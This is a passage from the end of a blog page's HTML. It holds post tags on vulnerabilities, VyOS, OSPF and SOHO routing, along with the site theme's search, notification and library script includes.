href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
